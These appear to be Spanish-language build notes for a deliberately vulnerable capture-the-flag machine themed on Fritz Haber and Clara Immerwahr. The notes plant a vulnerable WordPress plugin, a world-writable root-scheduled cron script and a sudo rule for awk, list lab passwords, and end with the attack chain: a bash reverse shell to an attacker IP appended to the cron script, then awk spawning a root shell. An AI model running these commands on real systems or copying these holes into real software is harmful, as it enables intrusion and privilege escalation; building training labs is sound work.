### Diagrama de la arquitectura del sistema

```bash
                                               ┌────────┐
                                               │  WEB   │
                                       ((WB-1))│  Blog  │ (WordPress)
                                               └───┬────┘ 
                                                   │ 
                                               ┌───▼────┐
                                       ((MD-2))│lighttpd│  
                                ┌─────────┐    └───┬────┘ 
                        ((MD-1))│ OpenSSH │        │ pt. 7664
                                └────┬────┘        │
                                     │ pt. 22      │ 
                                ┌────▼────┐    ┌───▼─────┐               
                      ((COM-1)) │   SSH   │    │  HTTP   │ ((COM-2))          
                                └─────────┘    └─────────┘      
                                     │              │      
                                     └──────┬───────┘
                                            │
                                    ┌───────▼───────┐
                     ((AC-1)) ──────│ Ubuntu Server │ ((SO-1)) 
                                    └───────┬───────┘
                                            │
                     ┌──────────────────────┴──────────────────────┐
                     ▼                                             ▼
            [ Movimiento Lateral ]                      [ Escalada a Root ]
         ┌───────────────────────┐                  ┌───────────────────────┐
         │     haber_fritz       │                  │    clara_immerwahr    │
         │                       │                  │                       │
         │ - Crontab modificable │ ─(Cron Ejecuta)─►│ - Permisos de Sudo:   │
         │   (/opt/scripts/...)  │                  │   /usr/bin/awk        │
         └───────────────────────┘                  └───────────┬───────────┘
                                                                │
                                                                ▼ (GTFOBins)
                                                            ┌───────────┐
                                                            │   ROOT    │
                                                            └───────────┘
```


```bash
haber_fritz@ammonia:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.5 LTS
Release:        22.04
Codename:       jammy

User: haber_fritz
Pass: 9/12/!1868_Br3sl$a5ia!
```

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install lighttpd mariadb-server php-cgi php-mysql php-curl php-gd php-xml php-mbstring unzip wget -y
```

```bash
sudo lighty-enable-mod fastcgi
sudo lighty-enable-mod fastcgi-php
sudo systemctl restart lighttpd
```
configruacion puerto numero cas amoniaco  El número CAS del amoníaco (NH₃) es 7664-41-7
```bash
sudo nano /etc/lighttpd/lighttpd.conf

server.modules = (
        "mod_indexfile",
        "mod_access",
        "mod_alias",
        "mod_redirect",
)

server.document-root        = "/var/www/html"
server.upload-dirs          = ( "/var/cache/lighttpd/uploads" )
server.errorlog             = "/var/log/lighttpd/error.log"
server.pid-file             = "/run/lighttpd.pid"
server.username             = "www-data"
server.groupname            = "www-data"
server.port                 = 7664
```
Instalacion DB
```bash
sudo mysql -u root

CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;
CREATE USER 'wp_user'@'localhost' IDENTIFIED BY '9/12/!1868_Br3sl$a5ia!';
GRANT ALL PRIVILEGES ON wordpress.* TO 'wp_user'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```
Instalacion WP
```bash
# Limpiar el index por defecto de lighttpd
sudo rm -f /var/www/html/index.lighttpd.html

# Descargar y descomprimir WordPress
cd /tmp
wget https://wordpress.org/latest.tar.gz
tar -xzvf latest.tar.gz

# Mover los archivos al directorio web
sudo cp -r wordpress/* /var/www/html/

# Ajustar los permisos para que Lighttpd (ejecutado bajo el usuario www-data) pueda usarlos
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/
```
Instalacuion plugin problematico
```bash
cd /var/www/html/wp-content/plugins/

sudo wget https://downloads.wordpress.org/plugin/mail-masta.zip

sudo unzip mail-masta.zip

sudo rm mail-masta.zip

sudo chown -R www-data:www-data /var/www/html/wp-content/plugins/mail-masta
```

http://192.168.184.140:7664/


crU^A5rRlwI3NdP7ff



Configuración segundo usuario 



sudo adduser clara_immerwahr
pacifista1915chemsitry!



sudo mkdir -p /opt/scripts
sudo nano /opt/scripts/backup_notes.sh



#!/bin/bash
# Backup de las notas científicas de Clara
tar -czf /home/clara_immerwahr/notes_backup.tar.gz /home/clara_immerwahr/documents/ 2>/dev/null


sudo chmod 777 /opt/scripts/backup_notes.sh
sudo nano /etc/crontab

  GNU nano 6.2                                                                                       /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *     * * *   clara_immerwahr /opt/scripts/backup_notes.sh

SUDO 


sudo visudo

@includedir /etc/sudoers.d

clara_immerwahr ALL=(ALL) NOPASSWD: /usr/bin/awk




ROOT
nc -lvnp 9001

haber_fritz@ammonia:~$ echo "bash -i >& /dev/tcp/192.168.1.104/9001 0>&1" >> /opt/scripts/backup_notes.sh

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.104] from (UNKNOWN) [192.168.1.103] 49488
bash: cannot set terminal process group (1938): Inappropriate ioctl for device
bash: no job control in this shell
clara_immerwahr@ammonia:~$ sudo awk 'BEGIN {system("/bin/sh")}'
sudo awk 'BEGIN {system("/bin/sh")}'
whoami
root




[ Atacante (Kali) ]
       │
       ▼ (LFI en WordPress)
[ user: haber_fritz ]  <-- (Sabe de química y procesos industriales)
       │
       ▼ (Movimiento Lateral: Tarea Cron / Script inseguro)
[ user: clara_immerwahr ] <-- (Su esposa, química brillante y pacifista opositora)
       │
       ▼ (Escalada de Privilegios: GTFOBins vía sudo o SUID)
[ ROOT ]

